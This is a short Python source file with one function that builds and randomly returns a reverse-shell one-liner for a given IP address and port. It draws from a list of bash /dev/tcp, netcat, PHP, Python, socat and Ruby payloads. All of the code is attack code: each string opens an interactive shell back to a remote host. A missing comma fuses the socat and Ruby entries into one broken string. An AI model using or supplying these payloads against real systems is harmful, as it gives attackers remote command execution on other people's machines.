import random as rand
from icecream import ic


def generate_revshell(ip_addr: str, port: int):
    try:
        shells = [f'''/bin/bash -i >& /dev/tcp/{ip_addr}/{port} 0>&1''',
                  f'''exec 5<>/dev/tcp/{ip_addr}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done''',
                  f'''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip_addr} {port} >/tmp/f''',
                  f'''nc {ip_addr} {port} -e /bin/bash''',
                  f'''php -r '$sock=fsockopen("{ip_addr}",{port});exec("/bin/bash <&3 >&3 2>&3");\'''',
                  f'''php -r '$sock=fsockopen("{ip_addr}",{port});passthru("/bin/bash <&3 >&3 2>&3");\'''',
                  f'''python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip_addr}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\'''',
                  f'''socat TCP:{ip_addr}:{port} EXEC:/bin/bash'''
                  f'''ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{ip_addr}",{port}))\'''']
        rev_shell = rand.choice(shells)
        return rev_shell
    except Exception as e:
        ic(e)
